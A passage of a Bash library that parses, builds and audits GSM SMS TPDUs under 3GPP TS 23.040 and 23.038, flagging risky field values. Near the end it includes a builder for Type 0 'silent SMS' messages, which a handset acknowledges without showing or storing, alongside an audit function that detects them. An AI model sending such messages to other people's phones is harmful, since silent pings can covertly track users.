    # A received address may carry non-integer semi-octets (§9.1.2.3).
    local shown; shown=$(printf '%s' "$digits" | sed -e 's/^A/*/; s/^B/#/; s/^C/a/; s/^D/b/; s/^E/c/')
    if (( ton == 5 )); then
        local ns=$(( alen * 4 / 7 ))
        printf 'addr_value\t%s\naddr_alpha_septets\t%d\naddr_alpha\t%s\n' \
            "$digits" "$ns" "$(otasm_tp_unpack_text "$val" "$ns" 2>/dev/null)"
    else
        printf 'addr_value\t%s\naddr_digits\t%s\n' "$digits" "$shown"
    fi
    return 0
}

# ── TS 23.040 §9.2.3.9 TP-PID ───────────────────────────────────────────
# bits 7..6 select the block; 00/01 with bit 5 = 0 is an SM-AL protocol id,
# with bit 5 = 1 a telematic device type.  The 01 block carries the silent
# Short Message Type 0 (0x40) and the Replace / Device-Triggering ids.
otasm_tp_pid_parse() {
    local h; h=$(otasm_norm_hex "${1:-}")
    otasm_is_hex "$h" && (( ${#h} == 2 )) || { printf 'ERROR\tTP-PID must be one octet\n' >&2; return 2; }
    local pid=$(( 16#$h ))
    local hi=$(( (pid >> 6) & 3 )) lo=$(( pid & 0x3F ))
    local grp meaning="" silent="no" finding_n=0
    case "$hi" in
        0|1)
            if (( (pid & 0x20) == 0 )); then
                grp="SME-to-SME / SM-AL protocol"
                meaning=$(printf 'SM-AL protocol id 0x%02X (no telematic interworking)' "$lo")
            else
                grp="telematic interworking"
                local dev=$(( pid & 0x1F ))
                case "$dev" in
                    0) meaning="implicit — device type is specific to this SC" ;;
                    1) meaning="telex (or teletex reduced to telex format)" ;;
                    2) meaning="group 3 telefax" ;;
                    3) meaning="group 4 telefax" ;;
                    4) meaning="voice telephone (conversion to speech)" ;;
                    5) meaning="ERMES" ;;
                    6) meaning="National Paging system" ;;
                    7) meaning="Videotex" ;;
                    8) meaning="teletex, carrier unspecified" ;;
                    9) meaning="teletex, in PSPDN" ;;
                    10) meaning="teletex, in CSPDN" ;;
                    11) meaning="teletex, in analog PSTN" ;;
                    12) meaning="teletex, in digital ISDN" ;;
                    13) meaning="UCI" ;;
                    16) meaning="message handling facility" ;;
                    17) meaning="public X.400-based message handling system" ;;
                    18) meaning="Internet Electronic Mail" ;;
                    31) meaning="GSM/UMTS mobile station" ;;
                    14|15|19|20|21|22|23) meaning="reserved telematic device type" ;;
                    *) meaning="value specific to the SC" ;;
                esac
            fi
            ;;
        2) grp="reserved"; meaning="reserved — an MS interprets this as 0x00 but stores it as received" ;;
        3) grp="SC specific"; meaning="for SC specific use" ;;
    esac
    if (( hi == 1 )); then
        case "$lo" in
            0) meaning="Short Message Type 0 — the ME acknowledges, discards, does not indicate and does not store it"
               silent="yes" ;;
            1|2|3|4|5|6|7) meaning=$(printf 'Replace Short Message Type %d' "$lo") ;;
            8) meaning="Device Triggering Short Message" ;;
            30) meaning="Enhanced Message Service (obsolete)" ;;
            31) meaning="Return Call Message" ;;
            60) meaning="ANSI-136 R-DATA" ;;
            61) meaning="ME Data download" ;;
            62) meaning="ME De-personalization Short Message" ;;
            63) meaning="(U)SIM Data download" ;;
        esac
    fi
    printf 'pid\t%s\npid_bits76\t%d\npid_group\t%s\npid_meaning\t%s\npid_silent\t%s\n' \
        "$h" "$hi" "$grp" "$meaning" "$silent"
    if (( pid == 0x40 )); then
        printf 'finding\tHIGH\tTP-PID 0x40 Short Message Type 0 — silent: acknowledged, not indicated, not stored (TS 23.040 §9.2.3.9)\n'
        finding_n=$(( finding_n + 1 ))
    elif (( pid == 0x48 )); then
        printf 'finding\tMEDIUM\tTP-PID 0x48 Device Triggering — consumed by the device/application, not necessarily shown to the user\n'
        finding_n=$(( finding_n + 1 ))
    elif (( hi == 2 )); then
        printf 'finding\tLOW\tTP-PID 0x%02X is reserved; a parser that treats it as a safe default would be wrong\n' "$pid"
        finding_n=$(( finding_n + 1 ))
    fi
    printf 'findings\t%d\n' "$finding_n"
    return 0
}

# ── TS 23.038 §4 TP-DCS ─────────────────────────────────────────────────
otasm_tp_dcs_parse() {
    local h; h=$(otasm_norm_hex "${1:-}")
    otasm_is_hex "$h" && (( ${#h} == 2 )) || { printf 'ERROR\tTP-DCS must be one octet\n' >&2; return 2; }
    local dcs=$(( 16#$h ))
    local grp=$(( (dcs >> 4) & 0x0F ))
    local group alpha class="none" compressed="no" meaning="" forced="no" n=0
    case "$grp" in
        0|1|2|3)
            group="general data coding (00xx)"
            (( (dcs >> 5) & 1 )) && compressed="yes"
            local cs=$(( (dcs >> 2) & 3 ))
            case "$cs" in
                0) alpha="GSM 7-bit default alphabet" ;;
                1) alpha="8-bit data" ;;
                2) alpha="UCS2 (16-bit)" ;;
                3) alpha="reserved character set" ;;
            esac
            if (( (dcs >> 4) & 1 )); then
                case $(( dcs & 3 )) in
                    0) class="0"; forced="yes" ;;
                    1) class="1" ;; 2) class="2" ;; 3) class="3" ;;
                esac
            fi
            meaning="$alpha"
            [[ "$compressed" == yes ]] && meaning+=", compressed (TS 23.042)"
            [[ "$class" != none ]] && meaning+=", message class $class"
            [[ "$class" == none ]] && meaning+=", no message class"
            ;;
        4|5|6|7)
            group="automatic deletion (01xx)"
            (( (dcs >> 5) & 1 )) && compressed="yes"
            local cs2=$(( (dcs >> 2) & 3 ))
            case "$cs2" in
                0) alpha="GSM 7-bit default alphabet" ;; 1) alpha="8-bit data" ;;
                2) alpha="UCS2 (16-bit)" ;; 3) alpha="reserved character set" ;;
            esac
            meaning="marked for automatic deletion after reading; $alpha"
            ;;
        8|9|10|11)
            group="reserved coding group"
            alpha="unknown"
            meaning=$(printf 'reserved coding group %d — never classified as a safe default (TS 23.038 §4)' "$grp")
            ;;
        12)
            group="MWI: discard message (1100)"
            alpha="GSM 7-bit default alphabet"
            meaning="message waiting indication, discard after presenting"
            ;;
        13|14)
            group="MWI: store message ($([[ $grp == 13 ]] && echo 1101 || echo 1110))"
            alpha=$([[ $grp == 14 ]] && echo "UCS2 (16-bit)" || echo "GSM 7-bit default alphabet")
            local sense=$(( (dcs >> 3) & 1 ))
            local itype=$(( dcs & 3 ))
            local it_t
            case "$itype" in 0) it_t="voicemail" ;; 1) it_t="fax" ;; 2) it_t="electronic mail" ;; 3) it_t="other" ;; esac
            meaning="message waiting $it_t $( ((sense==1)) && echo active || echo inactive )"
            ;;
        15)
            group="data coding / message class (1111)"
            if (( (dcs >> 2) & 1 )); then alpha="8-bit data"; else alpha="GSM 7-bit default alphabet"; fi
            case $(( dcs & 3 )) in
                0) class="0"; forced="yes" ;; 1) class="1" ;; 2) class="2" ;; 3) class="3" ;;
            esac
            meaning="$alpha, message class $class"
            ;;
    esac
    printf 'dcs\t%s\ndcs_group_bits\t%d\ndcs_group\t%s\ndcs_alphabet\t%s\ndcs_class\t%s\ndcs_compressed\t%s\ndcs_meaning\t%s\n' \
        "$h" "$grp" "$group" "$alpha" "$class" "$compressed" "$meaning"
    printf 'dcs_class0_immediate_display\t%s\n' "$forced"
    if (( grp >= 8 && grp <= 11 )); then
        printf 'finding\tMEDIUM\tTP-DCS 0x%s is in a reserved coding group; an unknown DCS must not be treated as the 7-bit default\n' "$h"
        n=$(( n + 1 ))
    fi
    (( n == 0 )) && printf 'note\tINFO\tDCS 0x%s decoded to a defined TS 23.038 §4 group\n' "$h"
    printf 'findings\t%d\n' "$n"
    return 0
}
# alphabet: 7bit | 8bit | ucs2 ; class: none | 0..3 ; [compressed] [autodelete]
otasm_tp_dcs_build() {
    local alphabet="${1:-7bit}" class="${2:-none}" compressed="${3:-0}" del="${4:-0}" cs
    case "$alphabet" in
        7bit) cs=0 ;; 8bit) cs=1 ;; ucs2) cs=2 ;;
        *) printf 'ERROR\talphabet must be 7bit, 8bit or ucs2\n' >&2; return 2 ;;
    esac
    [[ "$compressed" =~ ^[01]$ && "$del" =~ ^[01]$ ]] || {
        printf 'ERROR\tcompressed and autodelete flags must be 0 or 1\n' >&2; return 2; }
    local cl=0 present=0
    case "$class" in
        none) present=0 ;;
        0) cl=0; present=1 ;; 1) cl=1; present=1 ;; 2) cl=2; present=1 ;; 3) cl=3; present=1 ;;
        *) printf 'ERROR\tclass must be none, 0, 1, 2 or 3\n' >&2; return 2 ;;
    esac
    local b=$(( (compressed << 5) | (present << 4) | (cs << 2) | cl ))
    (( del == 1 )) && b=$(( b | 0x40 ))
    printf '%02x\n' "$b"
}

# ── TS 23.040 §9.2.3.22 TP-FCS and §9.2.3.15 TP-ST ─────────────────────
otasm_tp_fcs_parse() {
    local h; h=$(otasm_norm_hex "${1:-}")
    otasm_is_hex "$h" && (( ${#h} == 2 )) || { printf 'ERROR\tTP-FCS must be one octet\n' >&2; return 2; }
    local v=$(( 16#$h )) t
    # NOTE: `case` patterns are globs, so these MUST be decimal — `0x80` would
    # never match the decimal expansion of $v.  This bit an earlier revision.
    case "$v" in
        128) t="Telematic interworking not supported" ;;
        129) t="Short message Type 0 not supported" ;;
        130) t="Cannot replace short message" ;;
        143) t="Unspecified TP-PID error" ;;
        144) t="Data coding scheme (alphabet) not supported" ;;
        145) t="Message class not supported" ;;
        159) t="Unspecified TP-DCS error" ;;
        160) t="Command cannot be actioned" ;;
        161) t="Command unsupported" ;;
        175) t="Unspecified TP-Command error" ;;
        176) t="TPDU not supported" ;;
        192) t="SC busy" ;;
        193) t="No SC subscription" ;;
        194) t="SC system failure" ;;
        195) t="Invalid SME address" ;;
        196) t="Destination SME barred" ;;
        197) t="SM Rejected-Duplicate SM" ;;
        198) t="TP-VPF not supported" ;;
        199) t="TP-VP not supported" ;;
        208) t="(U)SIM SMS storage full" ;;
        209) t="No SMS storage capability in (U)SIM" ;;
        210) t="Error in MS" ;;
        211) t="Memory Capacity Exceeded" ;;
        212) t="(U)SIM Application Toolkit Busy" ;;
        213) t="(U)SIM data download error" ;;
        255) t="Unspecified error cause" ;;
        *)
            if (( (v >= 0x80 && v <= 0x8E) || (v >= 0x92 && v <= 0x9E) || (v >= 0xA2 && v <= 0xAE) || (v >= 0xB1 && v <= 0xBF) || (v >= 0xC8 && v <= 0xCF) || (v >= 0xD6 && v <= 0xDF) )); then
                t="reserved — treat as an unspecified error cause"
            elif (( v <= 0x7F )); then
                t="reserved"
            else
                t="value specific to an application"
            fi ;;
    esac
    printf 'fcs\t%s\nfcs_meaning\t%s\n' "$h" "$t"
    (( v == 0x81 )) && printf 'note\tINFO\tTP-FCS 0x81 — the SC/ME rejected the message because Type 0 is not supported\n'
    return 0
}
otasm_tp_st_parse() {
    local h; h=$(otasm_norm_hex "${1:-}")
    otasm_is_hex "$h" && (( ${#h} == 2 )) || { printf 'ERROR\tTP-ST must be one octet\n' >&2; return 2; }
    local v=$(( 16#$h )) t
    if (( (v & 0x80) == 0x80 )); then
        printf 'st\t%s\nst_bits7\t1\nst_meaning\t%s\n' "$h" "bits 0..6 reserved for a value with bit 7 set"
        return 0
    fi
    # Decimal patterns again — see the note in otasm_tp_fcs_parse.
    case "$v" in
        0) t="Short message received by the SME (transaction completed)" ;;
        1) t="Short message forwarded by the SC to the SME but the SC is unable to confirm delivery" ;;
        2) t="Short message replaced by the SC" ;;
        32) t="Congestion (temporary error, SC still trying)" ;;
        33) t="SME busy (temporary error, SC still trying)" ;;
        34) t="No response from SME (temporary error, SC still trying)" ;;
        35) t="Service rejected (temporary error, SC still trying)" ;;
        36) t="Quality of service not available (temporary error, SC still trying)" ;;
        37) t="Error in SME (temporary error, SC still trying)" ;;
        64) t="Remote procedure error (permanent error)" ;;
        65) t="Incompatible destination (permanent error)" ;;
        66) t="Connection rejected by SME (permanent error)" ;;
        67) t="Not obtainable (permanent error)" ;;
        68) t="Quality of service not available (permanent error)" ;;
        69) t="No interworking available (permanent error)" ;;
        70) t="SM Validity Period Expired (permanent error)" ;;
        71) t="SM Deleted by originating SME (permanent error)" ;;
        72) t="SM Deleted by SC Administration (permanent error)" ;;
        73) t="SM does not exist (permanent error)" ;;
        96) t="Congestion (temporary error, SC not making any more attempts)" ;;
        97) t="SME busy (temporary error, SC not making any more attempts)" ;;
        98) t="No response from SME (temporary error, SC not making any more attempts)" ;;
        99) t="Service rejected (temporary error, SC not making any more attempts)" ;;
        100) t="Quality of service not available (temporary error, SC not making any more attempts)" ;;
        101) t="Error in SME (temporary error, SC not making any more attempts)" ;;
        *)
            if (( (v >= 0x03 && v <= 0x0F) || (v >= 0x26 && v <= 0x2F) || (v >= 0x4A && v <= 0x4F) || (v >= 0x66 && v <= 0x6F) )); then
                t="reserved — interpret as Service Rejected (0x23)"
            elif (( (v >= 0x10 && v <= 0x1F) || (v >= 0x30 && v <= 0x3F) || (v >= 0x50 && v <= 0x5F) || (v >= 0x70 && v <= 0x7F) )); then
                t="value specific to this SC"
            else
                t="unrecognised — interpret as Service Rejected (0x23)"
            fi ;;
    esac
    printf 'st\t%s\nst_bits7\t0\nst_meaning\t%s\n' "$h" "$t"
    return 0
}

# ── TS 23.040 §9.2.2 TPDU assembly ──────────────────────────────────────
# First octets (§9.2.3.1-.7, .17, .23, .25, .28):
#   SMS-DELIVER        bit0-1 MTI=00  bit2 TP-MMS  bit3 TP-LP  bit4 reserved
#                      bit5 TP-SRI  bit6 TP-UDHI  bit7 TP-RP
#   SMS-SUBMIT         bit0-1 MTI=01  bit2 TP-RD   bit3-4 TP-VPF
#                      bit5 TP-SRR  bit6 TP-UDHI  bit7 TP-RP
#   SMS-STATUS-REPORT  bit0-1 MTI=10  bit2 TP-MMS  bit3 TP-LP  bit4 reserved
#                      bit5 TP-SRQ  bit6 TP-UDHI  bit7 reserved
#   SMS-COMMAND        bit0-1 MTI=10  bit5 TP-SRR  bit6 TP-UDHI
# A reserved MTI is processed as SMS-DELIVER but stored exactly as received
# (§9.2.3.1), which is why the parser never silently coerces it.

# <oa_addr_hex> <pid> <dcs> <scts_hex> <ud_hex> <udl> [flags_octet_extra]
otasm_tpdu_build_deliver() {
    local oa="${1:-}" pid="${2:-00}" dcs="${3:-00}" scts="${4:-}" ud="${5:-}" udl="${6:-0}" extra="${7:-0}"
    local oh; oh=$(otasm_norm_hex "$oa")
    otasm_is_hex "$oh" && (( ${#oh} >= 4 )) || {
        printf 'ERROR\tTP-OA must be an address field (Length,Type-of-Address,value)\n' >&2; return 2; }
    local ph; ph=$(otasm_norm_hex "$pid"); otasm_is_hex "$ph" && (( ${#ph} == 2 )) || {
        printf 'ERROR\tTP-PID must be one octet\n' >&2; return 2; }
    local dh; dh=$(otasm_norm_hex "$dcs"); otasm_is_hex "$dh" && (( ${#dh} == 2 )) || {
        printf 'ERROR\tTP-DCS must be one octet\n' >&2; return 2; }
    local sh; sh=$(otasm_norm_hex "$scts"); otasm_is_hex "$sh" && (( ${#sh} == 14 )) || {
        printf 'ERROR\tTP-SCTS must be 7 octets\n' >&2; return 2; }
    local uh; uh=$(otasm_norm_hex "$ud")
    # An empty TP-UD is legitimate — and is exactly what a Type 0 silent
    # message carries — so it must pass here while malformed hex must not.
    [[ -z "$uh" ]] || otasm_is_hex "$uh" || { printf 'ERROR\tTP-UD must be hex\n' >&2; return 2; }
    [[ "$udl" =~ ^[0-9]+$ ]] || { printf 'ERROR\tTP-UDL must be a decimal octet\n' >&2; return 2; }
    (( udl >= 0 && udl <= 255 )) || { printf 'ERROR\tTP-UDL must fit one octet\n' >&2; return 2; }
    [[ "$extra" =~ ^(0[xX][0-9a-fA-F]+|[0-9]+)$ ]] || { printf 'ERROR\tflag bits must be a number\n' >&2; return 2; }
    # `extra` is the raw flags octet with the TP-MTI bits ignored, so callers
    # pass the real bit value (0x40 = TP-UDHI, 0x20 = TP-SRI/TP-SRR, ...).
    local b0=$(( extra & 0xFC ))
    printf '%02x%s%s%s%s%02x%s\n' "$b0" "$oh" "$ph" "$dh" "$sh" "$udl" "$uh"
}

# <da_addr_hex> <pid> <dcs> <ud_hex> <udl> [mr] [vpf] [vp_hex] [extra]
otasm_tpdu_build_submit() {
    local da="${1:-}" pid="${2:-00}" dcs="${3:-00}" ud="${4:-}" udl="${5:-0}" mr="${6:-0}" vpf="${7:-0}" vp="${8:-}" extra="${9:-0}"
    local ah; ah=$(otasm_norm_hex "$da")
    otasm_is_hex "$ah" && (( ${#ah} >= 4 )) || {
        printf 'ERROR\tTP-DA must be an address field\n' >&2; return 2; }
    [[ "$mr" =~ ^[0-9]+$ ]] && (( mr <= 255 )) || { printf 'ERROR\tTP-MR must be 0..255\n' >&2; return 2; }
    [[ "$vpf" =~ ^[0-3]$ ]] || { printf 'ERROR\tTP-VPF must be 0..3\n' >&2; return 2; }
    local vh; vh=$(otasm_norm_hex "$vp")
    local vpf_octets
    case "$vpf" in
        0) vpf_octets=0 ;;
        1) vpf_octets=1 ;;
        2) vpf_octets=7 ;;
        3) vpf_octets=7 ;;
    esac
    (( ${#vh} == vpf_octets * 2 )) || {
        printf 'ERROR\tTP-VPF %d needs %d octet(s) of TP-VP, got %d hex digits\n' \
            "$vpf" "$vpf_octets" "${#vh}" >&2; return 2; }
    # TP-VPF comes from its own argument because it also fixes the TP-VP
    # length; `extra` supplies the remaining flag bits raw (0x04 TP-RD,
    # 0x20 TP-SRR, 0x40 TP-UDHI, 0x80 TP-RP).
    local b0=$(( 0x01 | (extra & 0xE4) | ((vpf & 3) << 3) ))
    printf '%02x%02x%s%02x%02x%s%02x%s\n' \
        "$b0" "$mr" "$ah" "$(( 16#$(otasm_norm_hex "$pid") ))" "$(( 16#$(otasm_norm_hex "$dcs") ))" \
        "$vh" "$udl" "$(otasm_norm_hex "$ud")"
}

# Wrap a TPDU with an SMSC address field for the full "SCA ‖ TPDU" form that a
# modem expects.  An absent SMSC is encoded as the single octet 00.
otasm_smsc_wrap() {
    local sca="${1:-}" tpdu="${2:-}"
    local sh; sh=$(otasm_norm_hex "$sca"); local th; th=$(otasm_norm_hex "$tpdu")
    otasm_is_hex "$th" || { printf 'ERROR\tTPDU must be hex\n' >&2; return 2; }
    if [[ -z "$sh" ]]; then
        printf '00%s\n' "$th"
    else
        otasm_is_hex "$sh" || { printf 'ERROR\tSMSC address must be hex\n' >&2; return 2; }
        printf '%s%s\n' "$sh" "$th"
    fi
}

# ── TS 23.040 TPDU parsing ──────────────────────────────────────────────
_otasm_oct() { printf '%s' "${1:$(( $2 * 2 )):2}"; }

otasm_tpdu_parse() {
    local h; h=$(otasm_norm_hex "${1:-}")
    otasm_is_hex "$h" && (( ${#h} >= 2 )) || { printf 'ERROR\tTPDU must be hex\n' >&2; return 2; }
    (( ${#h} % 2 == 0 )) || { printf 'ERROR\tTPDU has an odd number of hex digits\n' >&2; return 2; }
    local n=$(( ${#h} / 2 ))
    local b0=$(( 16#$( _otasm_oct "$h" 0 ) ))
    local mti=$(( b0 & 3 ))
    local pos=1 nf=0
    printf 'tpdu\t%s\ntpdu_octets\t%d\nmti\t%d\n' "$h" "$n" "$mti"
    case "$mti" in
        0) printf 'mti_meaning\tSMS-DELIVER (or SMS-DELIVER-REPORT in the SC-to-MS direction)\n'
           printf 'mt_mms\t%d\nmt_lp\t%d\nmt_sri\t%d\nmt_udhi\t%d\nmt_rp\t%d\nmt_reserved_bit4\t%d\n' \
               "$(( (b0 >> 2) & 1 ))" "$(( (b0 >> 3) & 1 ))" "$(( (b0 >> 5) & 1 ))" \
               "$(( (b0 >> 6) & 1 ))" "$(( (b0 >> 7) & 1 ))" "$(( (b0 >> 4) & 1 ))" ;;
        1) printf 'mti_meaning\tSMS-SUBMIT (MS-to-SC) or SMS-SUBMIT-REPORT (SC-to-MS)\n'
           printf 'mt_rd\t%d\nmt_vpf\t%d\nmt_srr\t%d\nmt_udhi\t%d\nmt_rp\t%d\n' \
               "$(( (b0 >> 2) & 1 ))" "$(( (b0 >> 3) & 3 ))" "$(( (b0 >> 5) & 1 ))" \
               "$(( (b0 >> 6) & 1 ))" "$(( (b0 >> 7) & 1 ))" ;;
        2) printf 'mti_meaning\tSMS-STATUS-REPORT (SC-to-MS) or SMS-COMMAND (MS-to-SC)\n'
           printf 'mt_mms\t%d\nmt_lp\t%d\nmt_srq_ct\t%d\nmt_udhi\t%d\n' \
               "$(( (b0 >> 2) & 1 ))" "$(( (b0 >> 3) & 1 ))" "$(( (b0 >> 5) & 1 ))" "$(( (b0 >> 6) & 1 ))" ;;
        3) printf 'mti_meaning\treserved MTI — an MS must process this as SMS-DELIVER but store it exactly as received (§9.2.3.1)\n'
           printf 'finding\tMEDIUM\treserved TP-MTI 3; the TPDU below is decoded as SMS-DELIVER for display only\n'
           nf=$(( nf + 1 )) ;;
    esac

    # TP-OA / TP-DA / TP-RA all share the address field format.
    _otasm_read_addr() {
        local start=$1
        (( start < n )) || { printf 'ERROR\tTPDU truncated before an address field\n' >&2; return 2; }
        local alen=$(( 16#$( _otasm_oct "$h" "$start" ) ))
        local voctets=$(( (alen + 1) / 2 ))
        local total=$(( 1 + 1 + voctets ))
        (( start + total <= n )) || { printf 'ERROR\tTPDU truncated inside an address field\n' >&2; return 2; }
        printf '%s' "${h:$((start*2)):$((total*2))}"
        return 0
    }

    if (( mti == 0 || mti == 1 )); then
        local mr=""
        if (( mti == 1 )); then
            (( pos < n )) || { printf 'ERROR\tTPDU truncated before TP-MR\n' >&2; return 2; }
            mr=$( _otasm_oct "$h" "$pos" ); pos=$(( pos + 1 ))
            printf 'mr\t%s\n' "$mr"
        fi
        local afield; afield=$( _otasm_read_addr "$pos" ) || { printf 'ERROR\tTPDU truncated inside an address field\n' >&2; return 1; }
        if (( mti == 0 )); then
            echo "--- TP-OA"
            otasm_tp_addr_parse "$afield" | sed 's/^addr/oa/; s/^toa/oa_toa/'
        else
            echo "--- TP-DA"
            otasm_tp_addr_parse "$afield" | sed 's/^addr/da/; s/^toa/da_toa/'
        fi
        # `afield` already contains the Address-Length octet, so it advances
        # the cursor by its own length — adding 1 again shifts every later
        # field by an octet (this did exactly that in an earlier revision).
        local af_octets=$(( ${#afield} / 2 ))
        pos=$(( pos + af_octets ))
        (( pos + 2 <= n )) || { printf 'ERROR\tTPDU truncated before TP-PID/TP-DCS\n' >&2; return 1; }
        echo "--- TP-PID"
        otasm_tp_pid_parse "$( _otasm_oct "$h" "$pos" )"; pos=$(( pos + 1 ))
        echo "--- TP-DCS"
        local dcs_oct dcs_out dcs_alpha
        dcs_oct=$( _otasm_oct "$h" "$pos" )
        dcs_out=$( otasm_tp_dcs_parse "$dcs_oct" )
        printf '%s\n' "$dcs_out"
        dcs_alpha=$( printf '%s\n' "$dcs_out" | sed -n 's/^dcs_alphabet\t//p' )
        pos=$(( pos + 1 ))
        if (( mti == 0 )); then
            (( pos + 7 <= n )) || { printf 'ERROR\tTPDU truncated before TP-SCTS\n' >&2; return 1; }
            echo "--- TP-SCTS"
            otasm_tp_scts_parse "${h:$((pos*2)):14}"; pos=$(( pos + 7 ))
        else
            local vpf=$(( (b0 >> 3) & 3 )) vo
            case "$vpf" in 0) vo=0 ;; 1) vo=1 ;; *) vo=7 ;; esac
            if (( vo > 0 )); then
                (( pos + vo <= n )) || { printf 'ERROR\tTPDU truncated before TP-VP\n' >&2; return 1; }
                printf 'vp_octets\t%d\nvp\t%s\n' "$vo" "${h:$((pos*2)):$((vo*2))}"
                pos=$(( pos + vo ))
            fi
        fi
        (( pos < n )) || { printf 'ERROR\tTPDU truncated before TP-UDL\n' >&2; return 1; }
        local udl=$(( 16#$( _otasm_oct "$h" "$pos" ) )); pos=$(( pos + 1 ))
        printf -- '--- TP-UD\nudl\t%d\n' "$udl"
        local ud_hex="${h:$((pos*2))}"
        local ud_bytes=$(( n - pos ))
        printf 'ud_octets\t%d\nud\t%s\n' "$ud_bytes" "$ud_hex"
        # TP-UDL counts septets for the 7-bit alphabet and octets otherwise
        # (§9.2.3.16 / §9.2.4), so the two must be cross-checked, never assumed.
        if (( (b0 >> 6) & 1 )); then
            printf 'note\tINFO\tTP-UDHI is set: the first octets of TP-UD are a header, not text (TS 23.040 §9.2.3.23)\n'
            nf=$(( nf + 1 ))
        fi
        if (( ud_bytes == 0 && udl == 0 )); then
            printf 'ud_empty\tyes\n'
            printf 'finding\tHIGH\tzero-length TP-UD — the message carries no content, so nothing can be shown to the user\n'
            nf=$(( nf + 1 ))
        elif [[ "$dcs_alpha" == "GSM 7-bit default alphabet" ]]; then
            # TP-UDL counts septets only for the 7-bit alphabet (§9.2.3.16).
            local need=$(( (udl * 7 + 7) / 8 ))
            if (( ud_bytes == need )); then
                printf 'udl_units\tseptets (%d septets in %d octets)\n' "$udl" "$ud_bytes"
            else
                printf 'udl_units\tinconsistent\n'
                printf 'finding\tMEDIUM\tTP-UDL %d septets needs %d octets of TP-UD but %d are present\n' "$udl" "$need" "$ud_bytes"
                nf=$(( nf + 1 ))
            fi
        elif (( ud_bytes == udl )); then
            printf 'udl_units\toctets\n'
        else
            printf 'udl_units\tinconsistent\n'
            printf 'finding\tMEDIUM\tTP-UDL %d does not match %d octets of TP-UD under alphabet "%s"\n' "$udl" "$ud_bytes" "$dcs_alpha"
            nf=$(( nf + 1 ))
        fi
    elif (( mti == 2 )); then
        (( pos < n )) || { printf 'ERROR\tTPDU truncated before TP-MR\n' >&2; return 1; }
        printf 'mr\t%s\n' "$( _otasm_oct "$h" "$pos" )"; pos=$(( pos + 1 ))
        local rafield; rafield=$( _otasm_read_addr "$pos" ) || { printf 'ERROR\tTPDU truncated inside TP-RA\n' >&2; return 1; }
        echo "--- TP-RA"
        otasm_tp_addr_parse "$rafield" | sed 's/^addr/ra/; s/^toa/ra_toa/'
        pos=$(( pos + ${#rafield} / 2 ))
        if (( pos + 1 + 7 + 7 + 1 <= n )); then
            echo "--- TP-SCTS"
            otasm_tp_scts_parse "${h:$((pos*2)):14}"; pos=$(( pos + 7 ))
            printf 'dt\t%s\n' "${h:$((pos*2)):14}"; pos=$(( pos + 7 ))
            echo "--- TP-ST"
            local st; st=$( _otasm_oct "$h" "$pos" ); pos=$(( pos + 1 ))
            otasm_tp_st_parse "$st"
            local stv=$(( 16#$st ))
            if (( (stv & 0x80) == 0 )) && (( (stv >= 32 && stv <= 37) || (stv >= 96 && stv <= 101) )); then
                printf 'st_retryable\tyes\n'
            elif (( (stv & 0x80) == 0 )); then
                printf 'st_retryable\tno\n'
            fi
            local pi; pi=$( _otasm_oct "$h" "$pos" ); pos=$(( pos + 1 ))
            printf 'pi\t%s\n' "$pi"
            printf 'pi_pid_present\t%d\npi_dcs_present\t%d\npi_udl_present\t%d\n' \
                "$(( 16#$pi & 1 ))" "$(( (16#$pi >> 1) & 1 ))" "$(( (16#$pi >> 2) & 1 ))"
        else
            echo "--- SMS-STATUS-REPORT too short for TP-SCTS/TP-DT/TP-ST; treating as SMS-COMMAND"
            (( pos + 1 <= n )) || { printf 'finding\tMEDIUM\tTPDU ends after the address; no TP-ST present\n'; nf=$(( nf + 1 )); }
        fi
    fi
    printf 'findings\t%d\n' "$nf"
    return 0
}

# ── Type 0 silent SMS (TS 23.040 §9.2.3.9 + §9.2.3.1 note) ──────────────
# A Type 0 message is the smallest thing a network can deliver to a handset:
# TP-PID 0x40 with an empty TP-UD.  The ME acknowledges it and then discards
# it without indicating or storing it, so it is invisible to the user and does
# not consume SMS storage.  This builds one for an owned handset or the
# loopback SMSC the module's own plan describes.
otasm_type0_build() {
    local oa="${1:-}" scts="${2:-}" dcs="${3:-00}"
    if [[ -z "$oa" ]]; then
        # Default originator: international 0000 (a network-internal address
        # that no handset can reply to).
        oa=$(otasm_tp_addr_build 1 1 0000) || return 2
    fi
    if [[ -z "$scts" ]]; then
        scts=$(otasm_tp_scts_build "$(date -u +%y%m%d%H%M%S)" 0) || return 2
    fi
    otasm_tpdu_build_deliver "$oa" 40 "$dcs" "$scts" "" 0 0
}

# Audit a hex TPDU for the Type 0 / silent-message properties.
otasm_type0_audit() {
    local h; h=$(otasm_norm_hex "${1:-}")
    otasm_is_hex "$h" && (( ${#h} >= 2 )) || { printf 'ERROR\tTPDU must be hex\n' >&2; return 2; }
    local b0=$(( 16#$( _otasm_oct "$h" 0 ) ))
    local mti=$(( b0 & 3 ))
    # Walk to TP-PID: skip the first octet, optional TP-MR, then TP-OA/TP-DA.
    local pos=1
    (( mti == 1 )) && pos=$(( pos + 1 ))
    local n=$(( ${#h} / 2 ))
    (( pos < n )) || { printf 'ERROR\tTPDU too short to contain an address\n' >&2; return 2; }
    local alen=$(( 16#$( _otasm_oct "$h" "$pos" ) ))
    pos=$(( pos + 2 + (alen + 1) / 2 ))
    (( pos < n )) || { printf 'ERROR\tTPDU too short to contain TP-PID\n' >&2; return 2; }
    local pid=$(( 16#$( _otasm_oct "$h" "$pos" ) )); pos=$(( pos + 1 ))
    (( pos < n )) || { printf 'ERROR\tTPDU too short to contain TP-DCS\n' >&2; return 2; }
    local dcs=$(( 16#$( _otasm_oct "$h" "$pos" ) )); pos=$(( pos + 1 ))
    printf 'type0_mti\t%d\ntype0_pid\t%02x\ntype0_dcs\t%02x\ntype0_is_type0\t%s\n' \
        "$mti" "$pid" "$dcs" "$( ((pid == 0x40)) && echo yes || echo no )"
    (( pid == 0x40 )) || {
        printf 'note\tINFO\tTP-PID 0x%02X is not Short Message Type 0 (0x40); no silence property to report\n' "$pid"
        printf 'findings\t0\n'; return 0; }
    local found=0
    if (( mti == 0 )); then
        found=$(( found + 1 ))
        printf 'finding\tHIGH\tTP-PID 0x40 Short Message Type 0: the ME discards this without indicating or storing it (TS 23.040 §9.2.3.9)\n'
    else
        printf 'note\tINFO\tTP-PID 0x40 in a non-DELIVER TPDU (MTI %d); Type 0 is an MS-terminated property\n' "$mti"
    fi
    found=$(( found + 1 ))
    printf 'finding\tMEDIUM\tTP-DCS 0x%02X decides whether a payload would be rendered at all; with an empty TP-UD there is nothing to render\n' "$dcs"
    printf 'note\tINFO\tTP-FCS 0x81 is the failure cause an SC returns when it does not support Type 0 (TS 23.040 §9.2.3.22)\n'
